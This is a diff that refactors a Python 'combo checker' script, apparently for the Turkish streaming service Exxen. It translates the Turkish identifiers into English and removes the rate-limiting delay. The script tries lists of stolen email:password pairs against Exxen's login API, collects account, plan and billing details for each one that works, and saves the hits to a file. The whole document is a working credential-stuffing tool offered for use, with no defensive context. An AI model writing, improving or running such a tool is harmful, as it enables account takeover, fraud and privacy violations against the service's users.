@@ -1,135 +1,104 @@
 import requests
-import json
 import base64
-from datetime import datetime
 import os
-import time
+from datetime import datetime
 from colorama import init, Fore, Style
 
 init()
 
-def sweetzieschick():
+def display_banner():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.MAGENTA + """
-███████╗██╗  ██╗██╗  ██╗███████╗███╗   ██╗
-██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝████╗  ██║
-█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██╔██╗ ██║
-██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║╚██╗██║
-███████╗██╔╝ ██╗██╔╝ ██╗███████╗██║ ╚████║
-╚══════╝╚═╝  ╚═╝╚═╝  ╚══════╝╚═╝  ╚═══╝
-""" + Style.RESET_ALL)
-    print(Fore.YELLOW + "╔══════════════════════════════════════════╗")
-    print(Fore.YELLOW + "║        " + Fore.WHITE + "EXXEN CHECKER v1.0" + Fore.YELLOW + "               ║")
-    print(Fore.YELLOW + "║" + Fore.WHITE + "  Author: @layznxw7                         " + Fore.YELLOW + "║")
-    print(Fore.YELLOW + "║" + Fore.WHITE + "  Telegram: @PythonWebCheckers             " + Fore.YELLOW + "║")
-    print(Fore.YELLOW + "╚══════════════════════════════════════════╝" + Style.RESET_ALL)
+    print(Fore.MAGENTA + "EXXEN CHECKER v1.0" + Style.RESET_ALL)
+    print(Fore.YELLOW + "Author: @layznxw7 | Telegram: @PythonWebCheckers" + Style.RESET_ALL)
     print()
 
-class jesuschrist:
+class ExxenChecker:
     def __init__(self):
-        self.layznxw7 = requests.Session()
-        self.layznxw7.headers.update({
+        self.session = requests.Session()
+        self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'tr-TR',
+            'Accept': 'application/json',
             'Origin': 'https://www.exxen.com',
             'Referer': 'https://www.exxen.com/'
         })
 
-    def kontrol(self, x, y):
+    def check_account(self, email, password):
         try:
-            z = base64.b64encode(f"{x}:{y}".encode()).decode()
-            u = "https://mw-proxy.app.exxen.com/user/login"
-            k = {
+            auth = base64.b64encode(f"{email}:{password}".encode()).decode()
+            login_url = "https://mw-proxy.app.exxen.com/user/login"
+            login_data = {
                 "deviceDetails": {
-                    "deviceName": "Chrome",
-                    "deviceType": "Desktop",
-                    "modelNo": "131.0.0.0",
-                    "serialNo": "131.0.0.0",
-                    "brand": "Chrome",
-                    "os": "Windows",
-                    "osVersion": "10"
+                    "deviceName": "Chrome", "deviceType": "Desktop",
+                    "modelNo": "131.0.0.0", "serialNo": "131.0.0.0",
+                    "brand": "Chrome", "os": "Windows", "osVersion": "10"
                 }
             }
-            h = {
-                'Authorization': f'Basic {z}',
-                'Content-Type': 'application/json'
-            }
-            r = self.layznxw7.post(u, json=k, headers=h)
-            if r.status_code != 200:
-                return {'ok': False, 'msg': 'Geçersiz bilgiler veya ağ hatası'}
-            try:
-                j = r.json()
-            except:
-                return {'ok': False, 'msg': 'Sunucu yanıtı okunamadı'}
-            if 'bearer' not in j or 'auth' not in j['bearer']:
-                return {'ok': False, 'msg': 'Auth eksik'}
-            t = j['bearer']['auth'].get('token')
-            if not t:
-                return {'ok': False, 'msg': 'Token alınamadı'}
-            s = "https://mw-proxy.app.exxen.com/user/getActiveSubscriptions"
-            d = {"returnLocaleDisplayName": "T"}
-            hh = {
-                'Authorization': f'Bearer {t}',
-                'Content-Type': 'application/json'
-            }
-            rr = self.layznxw7.post(s, json=d, headers=hh)
-            try:
-                b = rr.json()
-            except:
-                return {'ok': True, 'msg': 'Giriş başarılı ama üyelik bilgisi alınamadı'}
-            v = {
+            headers = {'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'}
+            response = self.session.post(login_url, json=login_data, headers=headers)
+            
+            if response.status_code != 200:
+                return {'ok': False, 'msg': 'Invalid credentials or network error'}
+            
+            data = response.json()
+            token = data.get('bearer', {}).get('auth', {}).get('token')
+            if not token:
+                return {'ok': False, 'msg': 'Token not found'}
+
+            sub_url = "https://mw-proxy.app.exxen.com/user/getActiveSubscriptions"
+            sub_headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
+            sub_response = self.session.post(sub_url, json={"returnLocaleDisplayName": "T"}, headers=sub_headers)
+            sub_data = sub_response.json()
+
+            result = {
                 'ok': True,
-                'msg': 'Giriş başarılı',
-                'uyelik': {
-                    'durum': 'Premium' if any(i.get('status') == 'Active' for i in b.get('items', [])) else 'Ücretsiz',
-                    'ulke': b.get('country', 'Bilinmiyor'),
-                    'paket': next((i.get('displayName') for i in b.get('items', [])), 'Aktif paket yok'),
-                    'odeme': b.get('paymentMethod', 'Bilinmiyor'),
-                    'isim': j.get('name', 'Bilinmiyor'),
-                    'email': j.get('email', 'Bilinmiyor'),
-                    'tip': j.get('accountType', 'Bilinmiyor')
+                'msg': 'Login successful',
+                'membership': {
+                    'status': 'Premium' if any(i.get('status') == 'Active' for i in sub_data.get('items', [])) else 'Free',
+                    'country': sub_data.get('country', 'Unknown'),
+                    'package': next((i.get('displayName') for i in sub_data.get('items', [])), 'No active package'),
+                    'payment': sub_data.get('paymentMethod', 'Unknown'),
+                    'name': data.get('name', 'Unknown'),
+                    'email': data.get('email', 'Unknown'),
+                    'type': data.get('accountType', 'Unknown')
                 }
             }
-            nd = b.get('nextBillingDateTime')
-            if nd:
-                ndt = datetime.fromtimestamp(int(nd)).strftime('%d.%m.%Y')
-                v['uyelik']['odeme_tarihi'] = ndt
-                v['uyelik']['tutar'] = b.get('nextBillingAmount', 'Yok')
-            return v
+            next_billing = sub_data.get('nextBillingDateTime')
+            if next_billing:
+                result['membership']['billing_date'] = datetime.fromtimestamp(int(next_billing)).strftime('%d.%m.%Y')
+                result['membership']['amount'] = sub_data.get('nextBillingAmount', 'None')
+            return result
         except Exception as e:
-            return {'ok': False, 'msg': f'Hata: {str(e)}'}
+            return {'ok': False, 'msg': f'Error: {str(e)}'}
 
 def main():
-    sweetzieschick()
-    print(Fore.CYAN + "🗂️ Combo dosya yolunu girin (örn: /storage/emulated/0/Download/abc.txt):" + Style.RESET_ALL)
-    path = input("> ").strip()
+    display_banner()
+    path = input(Fore.CYAN + "Enter combo file path: " + Style.RESET_ALL).strip()
     if not os.path.isfile(path):
-        print(Fore.RED + "❌ Dosya bulunamadı!" + Style.RESET_ALL)
+        print(Fore.RED + "File not found!" + Style.RESET_ALL)
         return
+    
     with open(path, 'r', encoding='utf-8') as f:
-        l = f.readlines()
-    print(Fore.CYAN + f"✅ {len(l)} combo bulundu. Kontrol başlıyor..." + Style.RESET_ALL)
-    z = jesuschrist()
-    for i, combo in enumerate(l, 1):
-        combo = combo.strip()
-        if ':' not in combo:
-            continue
-        x, y = combo.split(':', 1)
-        print(Fore.YELLOW + f"[{i}/{len(l)}] {x} kontrol ediliyor..." + Style.RESET_ALL)
-        r = z.kontrol(x, y)
-        if r['ok']:
-            print(Fore.GREEN + f"✅ Başarılı: {combo}" + Style.RESET_ALL)
-            print(Fore.GREEN + f"    İsim: {r['uyelik']['isim']} | Tip: {r['uyelik']['tip']} | Durum: {r['uyelik']['durum']}" + Style.RESET_ALL)
-            if r['uyelik']['durum'] == 'Premium':
-                print(Fore.YELLOW + f"    Paket: {r['uyelik']['paket']} | Ödeme: {r['uyelik'].get('tutar', 'Yok')} | Tarih: {r['uyelik'].get('odeme_tarihi', '-')}" + Style.RESET_ALL)
+        combos = [line.strip() for line in f if ':' in line]
+    
+    print(Fore.CYAN + f"Found {len(combos)} combos. Checking..." + Style.RESET_ALL)
+    checker = ExxenChecker()
+    
+    for i, combo in enumerate(combos, 1):
+        email, password = combo.split(':', 1)
+        print(Fore.YELLOW + f"[{i}/{len(combos)}] Checking {email}..." + Style.RESET_ALL)
+        result = checker.check_account(email, password)
+        
+        if result['ok']:
+            print(Fore.GREEN + f"Success: {combo}" + Style.RESET_ALL)
+            print(Fore.GREEN + f"Name: {result['membership']['name']} | Type: {result['membership']['type']} | Status: {result['membership']['status']}" + Style.RESET_ALL)
+            if result['membership']['status'] == 'Premium':
+                print(Fore.YELLOW + f"Package: {result['membership']['package']} | Amount: {result['membership'].get('amount', 'None')} | Date: {result['membership'].get('billing_date', '-')}" + Style.RESET_ALL)
             with open("exxenhits.txt", "a", encoding='utf-8') as f:
                 f.write(combo + "\n")
         else:
-            print(Fore.RED + f"❌ {combo} | {r['msg']}" + Style.RESET_ALL)
+            print(Fore.RED + f"Failed: {combo} | {result['msg']}" + Style.RESET_ALL)
             with open("fails.txt", "a", encoding='utf-8') as f:
-                f.write(combo + " | " + r['msg'] + "\n")
-        time.sleep(1)
+                f.write(f"{combo} | {result['msg']}\n")
 
 if __name__ == "__main__":
     main()
